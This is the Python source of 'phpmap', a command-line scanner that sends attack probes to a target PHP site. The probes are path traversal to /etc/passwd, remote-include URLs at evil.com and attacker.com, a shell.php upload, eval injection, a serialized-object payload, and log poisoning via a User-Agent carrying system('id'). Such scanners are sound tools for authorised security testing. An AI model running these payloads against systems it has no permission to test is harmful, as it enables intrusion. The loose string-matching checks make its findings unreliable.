#!/usr/bin/env python3

"""
phpmap - PHP Vulnerability Scanner
Version: 1.0.0
Author: MQZ
License: Apache 2.0
"""

import argparse
import requests
import sys
import urllib.parse
import re

__version__ = "1.0.0"


class PhpMap:
    def __init__(self, url):
        self.url = url if url.startswith("http") else f"http://{url}"
        self.session = requests.Session()

    def check_lfi(self):
        print("[*] Running LFI scanner...")
        payloads = [
            "../../../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
        ]

        for payload in payloads:
            parsed_url = urllib.parse.urlparse(self.url)
            query = urllib.parse.parse_qs(parsed_url.query)
            for param in query:
                original = query[param][0]
                query[param][0] = payload
                new_query = urllib.parse.urlencode(query, doseq=True)
                target = self.url.split("?")[0] + "?" + new_query
                try:
                    res = self.session.get(target, timeout=5)
                    if "root:x:" in res.text or "[extensions]" in res.text:
                        print(f"[+] LFI detected: {target}")
                    else:
                        print(f"[-] Not vulnerable: {target}")
                except requests.RequestException:
                    print(f"[!] Request failed: {target}")
                query[param][0] = original

    def check_rfi(self):
        print("[*] Running RFI scanner...")
        payloads = [
            "http://evil.com/shell.txt",
            "https://attacker.com/malicious.txt",
        ]

        parsed_url = urllib.parse.urlparse(self.url)
        query = urllib.parse.parse_qs(parsed_url.query)
        for param in query:
            original = query[param][0]
            for payload in payloads:
                query[param][0] = payload
                new_query = urllib.parse.urlencode(query, doseq=True)
                target = self.url.split("?")[0] + "?" + new_query
                try:
                    res = self.session.get(target, timeout=5)
                    if "shell" in res.text.lower() or "malicious" in res.text.lower():
                        print(f"[+] RFI vulnerability detected: {target}")
                    else:
                        print(f"[-] Not vulnerable: {target}")
                except requests.RequestException:
                    print(f"[!] Request failed: {target}")
                query[param][0] = original

    def check_upload_bypass(self):
        print("[*] Running Upload Bypass scanner...")
        test_url = self.url
        files = {
            "file": ("shell.php", "<?php echo 'Upload test'; ?>", "application/x-php")
        }
        try:
            res = self.session.post(test_url, files=files, timeout=5)
            if res.status_code in [200, 201] and "Upload test" in res.text:
                print(f"[+] Upload bypass may be possible at: {test_url}")
            else:
                print(f"[-] Upload bypass not detected at: {test_url}")
        except requests.RequestException:
            print(f"[!] Upload request failed: {test_url}")

    def check_deserialization(self):
        print("[*] Running PHP Deserialization scanner...")
        payload = "O:8:\"Exploit\":0:{}"
        parsed_url = urllib.parse.urlparse(self.url)
        query = urllib.parse.parse_qs(parsed_url.query)
        for param in query:
            original = query[param][0]
            query[param][0] = payload
            new_query = urllib.parse.urlencode(query, doseq=True)
            target = self.url.split("?")[0] + "?" + new_query
            try:
                res = self.session.get(target, timeout=5)
                if "error" in res.text.lower() or "exception" in res.text.lower():
                    print(f"[+] Possible PHP deserialization detected: {target}")
                else:
                    print(f"[-] Not vulnerable to deserialization: {target}")
            except requests.RequestException:
                print(f"[!] Request failed: {target}")
            query[param][0] = original

    def check_eval_injection(self):
        print("[*] Running Eval Injection scanner...")
        payload = "phpinfo();"
        parsed_url = urllib.parse.urlparse(self.url)
        query = urllib.parse.parse_qs(parsed_url.query)
        for param in query:
            original = query[param][0]
            query[param][0] = payload
            new_query = urllib.parse.urlencode(query, doseq=True)
            target = self.url.split("?")[0] + "?" + new_query
            try:
                res = self.session.get(target, timeout=5)
                if "phpinfo" in res.text.lower():
                    print(f"[+] Eval injection detected: {target}")
                else:
                    print(f"[-] Not vulnerable to eval injection: {target}")
            except requests.RequestException:
                print(f"[!] Request failed: {target}")
            query[param][0] = original

    def check_log_poisoning(self):
        print("[*] Running Log Poisoning check...")
        headers = {
            "User-Agent": "<?php system('id'); ?>"
        }
        try:
            res = self.session.get(self.url, headers=headers, timeout=5)
            if res.status_code == 200:
                print(f"[+] Log poisoning payload sent to: {self.url}")
            else:
                print(f"[-] Unable to determine log poisoning potential: {self.url}")
        except requests.RequestException:
            print(f"[!] Log poisoning request failed: {self.url}")

    def run(self, args):
        if args.lfi:
            self.check_lfi()
        if args.rfi:
            self.check_rfi()
        if args.upload_bypass:
            self.check_upload_bypass()
        if args.deserialization:
            self.check_deserialization()
        if args.eval:
            self.check_eval_injection()
        if args.log_poison:
            self.check_log_poisoning()


def main():
    parser = argparse.ArgumentParser(description="phpmap - PHP Vulnerability Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--lfi", action="store_true", help="Run LFI scanner")
    parser.add_argument("--rfi", action="store_true", help="Run RFI scanner")
    parser.add_argument("--upload-bypass", action="store_true", help="Scan for file upload bypasses")
    parser.add_argument("--deserialization", action="store_true", help="Scan for PHP deserialization flaws")
    parser.add_argument("--eval", action="store_true", help="Scan for eval injection flaws")
    parser.add_argument("--log-poison", action="store_true", help="Scan for log poisoning flaws")
    parser.add_argument("--version", action="version", version=f"phpmap {__version__}")

    args = parser.parse_args()

    scanner = PhpMap(args.url)
    scanner.run(args)


if __name__ == "__main__":
    main()
